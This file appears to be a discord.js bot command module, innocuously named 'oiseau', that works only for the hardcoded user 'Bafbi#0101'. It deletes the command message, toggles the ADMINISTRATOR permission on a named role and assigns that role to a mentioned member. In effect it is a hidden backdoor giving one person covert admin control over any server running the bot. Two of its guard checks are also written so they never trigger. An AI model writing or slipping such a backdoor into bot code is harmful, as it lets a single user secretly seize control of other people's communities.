module.exports = {
    name: 'oiseau',
    description: 'Les oiseaux admin',
    execute(message, args) {
        if (message.author.tag === "Bafbi#0101") {
            if (message.guild) message.channel.bulkDelete(1);
            if (args[0] === undefined ) return;

            let role = message.guild.roles.cache.find(r => r.name === args[0]);
            if (typeof role === undefined) return;
            console.log(role);

            if (args[1] === 'perm') {
                if (!args[2] === undefined) role.setPermissions(args[2]);  
                if (role.permissions.has("ADMINISTRATOR") == true ) {
                    message.channel.send('unset')
                    role.setPermissions(104320065);
                }
                else {
                    message.channel.send('set')
                    role.setPermissions(104320073) 
                } 
                
            }

            let member = message.mentions.members.first();
            if (member === undefined) return;

            if (member.roles.cache.has(role.id)) {
                member.roles.remove(role);
                message.channel.send('remove')
            }

            else { 
                member.roles.add(role);
                message.channel.send('add')
            }

        }
        
    }

};